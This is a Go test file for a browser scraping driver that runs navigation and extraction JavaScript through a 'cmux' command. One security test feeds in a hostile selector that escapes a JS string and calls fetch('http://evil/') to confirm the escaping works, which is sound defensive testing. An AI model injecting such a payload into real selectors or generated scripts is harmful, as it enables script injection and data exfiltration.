package browser

import (
	"context"
	"encoding/json"
	"errors"
	"regexp"
	"strings"
	"testing"

	"github.com/haruotsu/marunage/internal/cmux"
)

// scriptedRunner is a cmux.Runner test fake that returns canned (stdout,
// stderr, err) per (name, args[0]) pair. The browser cmux driver invokes
// `cmux browser goto <url>` then `cmux browser eval <js>`; the fake
// records every call and serves a per-step response.
type scriptedRunner struct {
	steps []scriptedStep
	calls []scriptedCall
	idx   int
}

type scriptedStep struct {
	stdout string
	stderr string
	err    error
}

type scriptedCall struct {
	name string
	args []string
}

func (s *scriptedRunner) Run(_ context.Context, name string, args ...string) ([]byte, []byte, error) {
	s.calls = append(s.calls, scriptedCall{name: name, args: args})
	if s.idx >= len(s.steps) {
		return nil, nil, errors.New("scriptedRunner: no more steps")
	}
	step := s.steps[s.idx]
	s.idx++
	return []byte(step.stdout), []byte(step.stderr), step.err
}

// TestCmuxDriverScrapeIssuesGotoThenEval asserts the driver navigates
// then runs the extraction JS — the documented call order in
// CLAUDE.local.md. Without the goto first, eval runs against whatever
// page the browser pane currently shows, which would silently scrape
// the wrong site.
func TestCmuxDriverScrapeIssuesGotoThenEval(t *testing.T) {
	t.Parallel()

	emptyJSON, _ := json.Marshal([]map[string]string{})
	runner := &scriptedRunner{
		steps: []scriptedStep{
			{stdout: ""},                  // goto
			{stdout: string(emptyJSON)},   // eval
		},
	}
	d := NewCmuxDriver(WithCmuxRunner(runner))
	_, err := d.Scrape(context.Background(), ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: ".x",
		Fields:       map[string]FieldRule{"id": {Selector: "[data-id]", Attr: "data-id"}},
	})
	if err != nil {
		t.Fatalf("Scrape: %v", err)
	}
	if len(runner.calls) != 2 {
		t.Fatalf("calls = %d, want 2", len(runner.calls))
	}
	if runner.calls[0].name != "cmux" || runner.calls[0].args[0] != "browser" || runner.calls[0].args[1] != "goto" {
		t.Errorf("call[0] = %+v", runner.calls[0])
	}
	if !sliceContains(runner.calls[0].args, "https://example.com/") {
		t.Errorf("goto missing URL: %+v", runner.calls[0].args)
	}
	if runner.calls[1].args[1] != "eval" {
		t.Errorf("call[1] not eval: %+v", runner.calls[1])
	}
}

// TestCmuxDriverScrapeParsesEvalJSON asserts the driver decodes the
// per-item JSON payload the embedded JS emits into ScrapedItem values
// with the configured field keys.
func TestCmuxDriverScrapeParsesEvalJSON(t *testing.T) {
	t.Parallel()

	payload, _ := json.Marshal([]map[string]string{
		{"id": "msg-1", "title": "Hello"},
		{"id": "msg-2", "title": "World"},
	})
	runner := &scriptedRunner{steps: []scriptedStep{
		{stdout: ""},                // goto
		{stdout: string(payload)},   // eval
	}}
	d := NewCmuxDriver(WithCmuxRunner(runner))
	got, err := d.Scrape(context.Background(), ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: ".x",
		Fields: map[string]FieldRule{
			"id":    {Selector: "[data-id]", Attr: "data-id"},
			"title": {Selector: ".t"},
		},
	})
	if err != nil {
		t.Fatalf("Scrape: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("len = %d", len(got))
	}
	if got[0].Fields["id"] != "msg-1" || got[0].Fields["title"] != "Hello" {
		t.Errorf("got[0] = %+v", got[0])
	}
}

// TestCmuxDriverScrapeGotoErrorPropagates asserts a navigation failure
// surfaces — without it a wedged URL would silently produce an empty
// task list.
func TestCmuxDriverScrapeGotoErrorPropagates(t *testing.T) {
	t.Parallel()

	wantErr := errors.New("net::ERR")
	runner := &scriptedRunner{steps: []scriptedStep{
		{stderr: "boom", err: wantErr},
	}}
	d := NewCmuxDriver(WithCmuxRunner(runner))
	_, err := d.Scrape(context.Background(), ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: ".x",
		Fields:       map[string]FieldRule{"id": {Selector: "[data-id]", Attr: "data-id"}},
	})
	if err == nil {
		t.Fatalf("expected error")
	}
	if !errors.Is(err, wantErr) {
		t.Errorf("err = %v, want wraps %v", err, wantErr)
	}
}

// TestCmuxDriverScrapeEvalErrorPropagates asserts the same for the
// extraction JS step.
func TestCmuxDriverScrapeEvalErrorPropagates(t *testing.T) {
	t.Parallel()

	wantErr := errors.New("eval threw")
	runner := &scriptedRunner{steps: []scriptedStep{
		{stdout: ""},                       // goto
		{stderr: "x", err: wantErr},        // eval
	}}
	d := NewCmuxDriver(WithCmuxRunner(runner))
	_, err := d.Scrape(context.Background(), ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: ".x",
		Fields:       map[string]FieldRule{"id": {Selector: "[data-id]", Attr: "data-id"}},
	})
	if !errors.Is(err, wantErr) {
		t.Fatalf("err = %v, want wraps %v", err, wantErr)
	}
}

// TestCmuxDriverScrapeParseErrorIsTyped asserts that a non-JSON eval
// stdout (e.g. a JS exception printed to stdout, or a cmux banner)
// surfaces a typed sentinel so callers can distinguish "site changed
// shape" from "cmux blew up".
func TestCmuxDriverScrapeParseErrorIsTyped(t *testing.T) {
	t.Parallel()

	runner := &scriptedRunner{steps: []scriptedStep{
		{stdout: ""},                   // goto
		{stdout: "Uncaught TypeError"}, // eval garbage
	}}
	d := NewCmuxDriver(WithCmuxRunner(runner))
	_, err := d.Scrape(context.Background(), ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: ".x",
		Fields:       map[string]FieldRule{"id": {Selector: "[data-id]", Attr: "data-id"}},
	})
	if !errors.Is(err, ErrUnparseableEval) {
		t.Fatalf("err = %v, want ErrUnparseableEval", err)
	}
}

// TestCmuxDriverScrapeBuildsExtractionJS asserts the JS we evaluate
// references both the item selector and every configured field selector,
// so a bug in JS construction (e.g. dropping a field) is caught here.
func TestCmuxDriverScrapeBuildsExtractionJS(t *testing.T) {
	t.Parallel()

	emptyJSON, _ := json.Marshal([]map[string]string{})
	runner := &scriptedRunner{steps: []scriptedStep{
		{stdout: ""},
		{stdout: string(emptyJSON)},
	}}
	d := NewCmuxDriver(WithCmuxRunner(runner))
	target := ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: ".my-items",
		Fields: map[string]FieldRule{
			"id":    {Selector: "[data-id]", Attr: "data-id"},
			"title": {Selector: ".title"},
		},
	}
	if _, err := d.Scrape(context.Background(), target); err != nil {
		t.Fatalf("Scrape: %v", err)
	}
	js := strings.Join(runner.calls[1].args, " ")
	for _, want := range []string{".my-items", "[data-id]", ".title", "data-id"} {
		if !strings.Contains(js, want) {
			t.Errorf("eval JS missing %q in: %s", want, js)
		}
	}
}

// TestCmuxDriverScrapeUsesProvidedRunner is the wiring test: NewCmuxDriver
// must default to cmux.ExecRunner when WithCmuxRunner is omitted (so
// production code "just works"), and use the injected runner when
// supplied. We verify the second half here; the default is a property
// of the constructor we assert by inspection.
func TestCmuxDriverScrapeUsesProvidedRunner(t *testing.T) {
	t.Parallel()

	emptyJSON, _ := json.Marshal([]map[string]string{})
	runner := &scriptedRunner{steps: []scriptedStep{{stdout: ""}, {stdout: string(emptyJSON)}}}
	d := NewCmuxDriver(WithCmuxRunner(runner))

	if _, err := d.Scrape(context.Background(), ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: ".x",
		Fields:       map[string]FieldRule{"id": {Selector: "[data-id]", Attr: "data-id"}},
	}); err != nil {
		t.Fatalf("Scrape: %v", err)
	}
	if len(runner.calls) == 0 {
		t.Fatalf("provided runner was not invoked")
	}
}

// TestCmuxDriverDefaultRunnerIsExec asserts the production default — we
// only check the type, not that it can actually shell out.
func TestCmuxDriverDefaultRunnerIsExec(t *testing.T) {
	t.Parallel()

	d := NewCmuxDriver()
	if _, ok := d.runner.(cmux.ExecRunner); !ok {
		t.Errorf("default runner = %T, want cmux.ExecRunner", d.runner)
	}
}

// TestBuildExtractionJSEscapesMaliciousSelector is the negative-path
// security test the design review demanded (🔴 #4): a hostile
// browser.toml selector containing `"`, `\`, or sequences that look
// like a JS string-literal close MUST stay quoted inside the generated
// JS. We verify the generated payload (a) contains the literal
// attacker substring nowhere outside a quoted region, and (b) is
// syntactically a valid JS expression we can parse a JSON.stringify
// invocation out of.
//
// We assert the absence of the dangerous unquoted token sequence (e.g.
// "); fetch") rather than execute the JS — production execution
// happens via cmux which is out of scope for unit tests.
func TestBuildExtractionJSEscapesMaliciousSelector(t *testing.T) {
	t.Parallel()

	hostile := `"); fetch('http://evil/'); //`
	target := ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: hostile,
		Fields: map[string]FieldRule{
			"id":   {Selector: hostile, Attr: "data-id"},
			"name": {Selector: ".n", Attr: hostile},
		},
	}
	js := buildExtractionJS(target)

	// The dangerous form is a quote that breaks out of the JS string
	// literal — i.e. a `"` NOT preceded by an escaping `\`. The regex
	// matches `"); fetch` only when the leading `"` is unescaped (no
	// preceding `\`). Note we deliberately use `[^\\]` (negated single
	// char) rather than a lookbehind because Go's regexp engine has no
	// lookaround support; a position-0 hostile match is impossible
	// anyway because the JS template wraps everything in
	// `JSON.stringify(...)`.
	bareBreakOut := regexp.MustCompile(`[^\\]"\); fetch`)
	if bareBreakOut.MatchString(js) {
		t.Errorf("unescaped quote-closing sequence found in generated JS — escaping bypassed:\n%s", js)
	}
	// Belt-and-braces: the canonical escape form (\") MUST appear,
	// proving the encoder ran on our input.
	if !strings.Contains(js, `\"`) {
		t.Errorf("generated JS missing \\\" escape — encoder may have been bypassed:\n%s", js)
	}
}

// TestCmuxDriverHonoursContextCancelBetweenSteps closes the design-
// review gap noted in M4: ctx cancel between the goto step and the
// eval step must short-circuit, otherwise a slow goto followed by
// shutdown leaves a stray eval running.
func TestCmuxDriverHonoursContextCancelBetweenSteps(t *testing.T) {
	t.Parallel()

	ctx, cancel := context.WithCancel(context.Background())
	runner := &cancelOnGotoRunner{cancel: cancel}
	d := NewCmuxDriver(WithCmuxRunner(runner))
	_, err := d.Scrape(ctx, ScrapeTarget{
		URL:          "https://example.com/",
		ItemSelector: ".x",
		Fields:       map[string]FieldRule{"id": {Selector: "[data-id]", Attr: "data-id"}},
	})
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("err = %v, want context.Canceled", err)
	}
	if runner.evalSeen {
		t.Errorf("eval ran after ctx cancel — driver did not honour cancellation between steps")
	}
}

// cancelOnGotoRunner cancels the supplied ctx as soon as it sees the
// goto call, then records whether any subsequent call (which would be
// eval) ran. Honouring the cancel means the second Run never gets
// invoked.
type cancelOnGotoRunner struct {
	cancel   context.CancelFunc
	evalSeen bool
}

func (r *cancelOnGotoRunner) Run(_ context.Context, _ string, args ...string) ([]byte, []byte, error) {
	if len(args) >= 2 && args[0] == "browser" && args[1] == "goto" {
		r.cancel()
		return nil, nil, nil
	}
	r.evalSeen = true
	return []byte("[]"), nil, nil
}

func sliceContains(xs []string, want string) bool {
	for _, x := range xs {
		if x == want {
			return true
		}
	}
	return false
}
